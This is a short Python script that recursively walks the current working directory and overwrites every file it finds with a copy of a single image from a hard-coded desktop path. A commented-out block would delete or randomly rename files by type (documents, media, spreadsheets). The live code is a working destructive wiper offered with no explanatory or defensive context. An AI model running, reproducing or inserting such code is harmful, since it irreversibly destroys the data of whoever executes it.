#!/usr/bin/env python3
import os
import random
from shutil import copyfile
for folder, subfolders, files in os.walk(os.getcwd()):
    for file in files:
        filePath = os.path.join(os.path.abspath(folder), file)
        copyfile('C:/Users/brandonh/Desktop/grace_hopper.jpg', filePath)
        '''if ".jpg" in file:
            print(file)
            #os.remove(filePath)

        elif ".pdf" in file:
            print(file)
            #os.remove(filePath)
        elif ".JPG" in file:
            print(file)
            #os.remove(filePath)
        elif ".mpg" in file:
            print(file)
            #os.remove(filePath)
        elif ".mp4" in file:
            print(file)
            #os.remove(filePath)
        elif ".avi" in file:
            print(file)
            #os.remove(filePath)

        elif ".txt" in file:
            print(file)
            #os.remove(filePath)

        elif ".xlsx" in file:
            #rint = random.randrange(1, 500000)
            #os.rename(filePath, str(rint) + ".txt")
            print(file)
        elif ".doc" in file:
            #rint = random.randrange(1, 500000)
            #os.rename(filePath, str(rint) +".txt")
            print(file)'''

